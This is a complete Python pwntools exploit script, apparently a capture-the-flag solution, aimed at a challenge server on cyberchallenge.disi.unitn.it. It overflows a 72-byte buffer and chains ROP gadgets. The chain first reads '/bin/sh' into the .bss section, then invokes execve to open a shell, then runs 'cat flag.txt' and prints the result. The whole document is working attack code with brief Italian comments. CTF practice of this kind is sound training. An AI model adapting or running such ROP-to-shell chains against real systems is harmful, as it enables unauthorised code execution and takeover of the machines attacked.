from pwn import *

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 9201

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')

offset = 72
payload = b"A" * offset

pop_rax = 0x0000000000401199    #: pop rax; ret;
pop_rbp = 0x000000000040111d    #: pop rbp; ret; 
pop_rdi = 0x000000000040119b    #: pop rdi; ret; 
pop_rdx = 0x000000000040119f    #: pop rdx; ret; 
pop_rsi = 0x000000000040119d    #: pop rsi; ret; 
syscall = 0x00000000004011a3    #: syscall; nop; pop rbp; ret;

write_address = 0x0000000000404020      # Area .bss della memoria

payload += p64(pop_rax) + p64(0)    # Read syscall
payload += p64(pop_rdi) + p64(0)    # Standard input
payload += p64(pop_rsi) + p64(write_address)    # Indrizzo in cui possiamo scrivere e non usato dal programma
payload += p64(pop_rdx) + p64(8)    # Leggo 8 caratteri
payload += p64(syscall)

payload += p64(0xdeadbeef)      # Aggiunto a causa del pop rbp presente nel syscall gadget

payload += p64(pop_rax) + p64(59)
payload += p64(pop_rdi) + p64(write_address)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall)

conn.sendline(payload)

conn.send(b"/bin/sh\x00")

conn.sendline(b"cat flag.txt")
flag = conn.recvline().decode()

conn.close()
print(flag)